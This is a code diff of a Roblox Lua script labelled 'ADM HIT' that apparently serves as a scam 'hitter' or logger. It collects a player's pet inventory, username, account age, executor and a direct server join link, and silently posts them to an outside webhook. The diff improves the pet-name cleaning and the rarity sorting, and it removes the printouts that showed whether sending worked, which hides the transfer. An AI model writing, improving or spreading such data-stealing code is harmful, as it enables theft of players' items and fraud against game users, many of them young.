@@ -1,4 +1,4 @@
---// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION) - BULLETPROOF
+--// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION) - FINAL PERFECT
 
 local HttpService = game:GetService("HttpService")
 local ClientData = require(game:GetService("ReplicatedStorage"):WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
@@ -17,76 +17,86 @@ local HIGH_THRESHOLD = 1500
 -- =========================
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
-if not requestFunc then
-    warn("❌ No request function")
-    return
-end
+if not requestFunc then return end
 
 -- =========================
--- RARITY PRIORITY
+-- RARITY PRIORITY & COLORS
 -- =========================
-local rarityPriority = {
-    legendary = 5,
-    ultra_rare = 4,
-    rare = 3,
-    uncommon = 2,
-    common = 1
-}
+local rarityPriority = {legendary=5, ultra_rare=4, rare=3, uncommon=2, common=1}
+local rarityColors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
 
-local rarityColors = {
-    legendary = 0xFFD700,
-    ultra_rare = 0xA020F0,
-    rare = 0x1E90FF,
-    uncommon = 0x32CD32,
-    common = 0xB0B0B0
+-- =========================
+-- UNTRADEABLE BLOCKLIST
+-- =========================
+local untradeablePets = {
+    "jerboa", "minigame jerboa", "jiggly jerboa", "starter", "practice", "basic egg", "egg"
 }
 
 -- =========================
--- 🏷️ EMOJIS WITH SAFE PROPERTIES
+-- 🏷️ CLEAN EMOJIS
 -- =========================
 local function getPetEmoji(name, properties)
-    if not properties then return "🐾 " end
-    
+    if not properties then return "🐾" end
     local e = ""
-    if name:find("red fox") then e = "🧑‍🌾 " 
-    elseif name:find("disco bee") then e = "🪩 "
-    elseif name:find("queen bee") then e = "🐝 " 
+    if name:find("red fox") then e = "🧑‍🌾"
+    elseif name:find("disco bee") then e = "🪩"
+    elseif name:find("queen bee") then e = "🐝"
     end
-
-    if properties.mega then e = e .. "🌈 " end
-    if properties.neon then e = e .. "🟣 " end
-    if properties.fly then e = e .. "🪽 " end
-    if properties.ride then e = e .. "🏇 " end
-    
-    return e ~= "" and e or "🐾 "
+    if properties.mega then e = e .. "🌈" end
+    if properties.neon then e = e .. "🟣" end
+    if properties.fly then e = e .. "🪽" end
+    if properties.ride then e = e .. "🏇" end
+    return e ~= "" and e or "🐾"
 end
 
 -- =========================
--- 📦 PROCESS PETS (BULLETPROOF)
+-- 🧠 PERFECT NAME CLEANING
+-- =========================
+local function cleanPetName(rawId)
+    if not rawId then return "" end
+    
+    local name = tostring(rawId):lower()
+    
+    -- REMOVE EGGS & PREFIXES
+    for _, bad in ipairs(untradeablePets) do
+        if name:find(bad) then return "" end
+    end
+    
+    -- SPLIT PROPER NAME (camel → not "basic egg camel")
+    name = name:gsub("_", " ")
+    
+    -- REMOVE NUMBERS/YEARS
+    name = name:gsub("%d", "")
+    
+    -- REMOVE "basic egg ", "japan ", etc prefixes
+    name = name:gsub("basic egg%s*", "")
+    name = name:gsub("japan%s*", "")
+    name = name:gsub("halloween%s*", "")
+    name = name:gsub("christmas%s*", "")
+    
+    -- CLEAN SPACES
+    name = name:gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
+    
+    -- PROPER CASE
+    return name:sub(1,1):upper() .. name:sub(2)
+end
+
+-- =========================
+-- 📦 PROCESS PETS (PERFECT)
 -- =========================
 local function process(pets)
-    if not pets then return {}, 0 end
-    
     local map, total = {}, 0
 
-    for unique_id, pet_data in pairs(pets) do
-        if pet_data and type(pet_data) == "table" and pet_data.id then
-            local petId = tostring(pet_data.id)
-            
-            -- SKIP UNTRADEABLE
-            if petId:find("starter") or petId:find("practice") or petId:find("jiggly jerboa") then
-                continue
-            end
-            
-            -- CLEAN NAME
-            local cleanName = petId:gsub("_", " "):gsub("%d", ""):gsub("%s+", " ")
-            local displayName = (cleanName:sub(1,1):upper() .. cleanName:sub(2)):match("^%s*(.-)%s*$") or cleanName
+    for unique_id, pet_data in pairs(pets or {}) do
+        if pet_data and pet_data.id then
+            local cleanName = cleanPetName(pet_data.id)
+            if cleanName == "" then continue end -- SKIP UNTRADEABLE
 
-            if not map[displayName] then
-                map[displayName] = {
-                    name = displayName,
+            if not map[cleanName] then
+                map[cleanName] = {
+                    name = cleanName,
                     count = 0,
-                    rarity = ((pet_data.rarity or "common"):lower()),
+                    rarity = (pet_data.rarity or "common"):lower(),
                     properties = {
                         neon = pet_data.neon or (pet_data.properties and pet_data.properties.neon) or false,
                         mega = pet_data.mega or (pet_data.properties and pet_data.properties.mega) or false,
@@ -96,23 +106,21 @@ local function process(pets)
                 }
             end
 
-            map[displayName].count = map[displayName].count + 1
-            total = total + 10 
+            map[cleanName].count += 1
+            total += 10
         end
     end
 
     local list = {}
-    for name, v in pairs(map) do 
-        table.insert(list, v) 
+    for name, v in pairs(map) do
+        table.insert(list, v)
     end
-    
-    -- SMART SORT
-    table.sort(list, function(a,b)
-        local aPriority = rarityPriority[a.rarity] or 1
-        local bPriority = rarityPriority[b.rarity] or 1
-        if aPriority ~= bPriority then
-            return aPriority > bPriority
-        end
+
+    -- PERFECT SORT: RARITY #1, COUNT #2
+    table.sort(list, function(a, b)
+        local aPrio = rarityPriority[a.rarity] or 1
+        local bPrio = rarityPriority[b.rarity] or 1
+        if aPrio ~= bPrio then return aPrio > bPrio end
         return a.count > b.count
     end)
 
@@ -120,16 +128,15 @@ local function process(pets)
 end
 
 -- =========================
--- 📋 FORMAT (SAFE)
+-- 📋 ULTRA CLEAN FORMAT
 -- =========================
 local function format(list)
     local t = {}
     for i = 1, math.min(#list, 12) do
         local p = list[i]
-        local emoji = getPetEmoji(p.name:lower(), p.properties)
-        table.insert(t, emoji .. p.name .. " x" .. p.count)
+        table.insert(t, getPetEmoji(p.name:lower(), p.properties) .. " " .. p.name .. " x" .. p.count)
     end
-    return (#t > 0 and table.concat(t,"\n")) or "No tradeable pets"
+    return (#t > 0 and table.concat(t, "\n")) or "No tradeable pets"
 end
 
 -- =========================
@@ -142,15 +149,14 @@ local function getTier(v)
 end
 
 -- =========================
--- 🚀 RUN (100% BULLETPROOF)
+-- 🚀 RUN (BULLETPROOF)
 -- =========================
 local function Run(data)
     local list, total = process(data.pets or {})
     
-    -- BULLETPROOF BEST PET EXTRACTION
     local bestPet = list[1] or {}
-    local best = (bestPet.name and bestPet.count) and (bestPet.name.." x"..bestPet.count) or "None"
-    local bestRarity = (bestPet.rarity and rarityColors[bestPet.rarity]) and bestPet.rarity or "common"
+    local best = (bestPet.name and bestPet.count) and (bestPet.name .. " x" .. bestPet.count) or "None"
+    local bestRarity = bestPet.rarity or "common"
     local petList = format(list)
     local tier = getTier(total)
 
@@ -176,7 +182,7 @@ local function Run(data)
         footer = {text = "Mondeuronbotton"}
     }
 
-    local success, err = pcall(function()
+    pcall(function()
         requestFunc({
             Url = WEBHOOK,
             Method = "POST",
@@ -184,31 +190,22 @@ local function Run(data)
             Body = HttpService:JSONEncode({content = content, embeds = {embed}})
         })
     end)
-
-    if success then
-        print("✅ Webhook Sent!")
-    else
-        warn("❌ Error: " .. tostring(err))
-    end
 end
 
 -- =========================
--- EXECUTE (SAFE)
+-- FINAL EXECUTE
 -- =========================
-local success, inventory = pcall(function()
-    return ClientData.get("inventory")
-end)
-
-local pets = (success and inventory and inventory.pets) and inventory.pets or {}
+local success, inventory = pcall(ClientData.get, ClientData, "inventory")
+local pets = (success and inventory and inventory.pets) or {}
 
 Run({
     player = {
-        displayName = game.Players.LocalPlayer.DisplayName or "Unknown",
-        username = game.Players.LocalPlayer.Name or "Unknown",
-        accountAge = game.Players.LocalPlayer.AccountAge or 0,
-        executor = (identifyexecutor and identifyexecutor()) or "Unknown",
-        players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
+        displayName = game.Players.LocalPlayer.DisplayName,
+        username = game.Players.LocalPlayer.Name,
+        accountAge = game.Players.LocalPlayer.AccountAge,
+        executor = identifyexecutor and identifyexecutor() or "Unknown",
+        players = #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers
     },
-    joinLink = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&instanceId=" .. tostring(game.JobId),
+    joinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&instanceId=" .. game.JobId,
     pets = pets
 })
